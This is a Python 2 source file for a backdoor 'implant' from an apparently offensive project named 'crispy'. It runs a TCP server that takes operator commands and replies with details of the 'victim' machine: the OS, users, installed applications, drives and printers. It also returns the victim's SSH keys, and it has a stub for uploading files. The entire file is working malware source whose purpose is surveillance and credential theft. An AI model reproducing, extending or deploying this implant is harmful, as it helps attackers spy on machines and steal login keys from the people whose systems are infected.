import platform
import SocketServer
import sys

from crispy.os_types.macintosh import Mac

class ImplantHandler(SocketServer.BaseRequestHandler):
    
    def handle(self):
        if platform.system() == 'Darwin':
            victim = Mac()
        elif platform.system() == 'Windows':
            pass
        else:
            pass

        while True:
            try:
                self.data = self.request.recv(1024).strip()
                
                if self.data == "enum_os":
                    self.request.sendall(victim.enum_os())
                elif self.data == "enum_users":
                    self.request.sendall(victim.enum_users())
                elif self.data == "enum_applications":
                    self.request.sendall(victim.enum_applications())
                elif self.data == "enum_drives":
                    self.request.sendall(victim.enum_drives())
                elif self.data == "enum_printers":
                    self.request.sendall(victim.enum_printers())
                elif self.data == "get_ssh_keys":
                    self.request.sendall(victim.get_ssh_keys())
                elif self.data.startswith('upload') == True:
                    self.request.sendall("still working on")
                else:
                    self.request.sendall("unknown command")
            except:
                server.close_request(self.request)
                sys.exit(1)                            
        
if __name__ == "__main__":
    HOST, PORT = "localhost", 8080

    try:
        server = SocketServer.TCPServer((HOST, PORT), ImplantHandler)
        print "[+] Implant active...Terminate w/ Ctrl-C\n"
        server.serve_forever()
    except:
        print "[!] Couldn't start server"
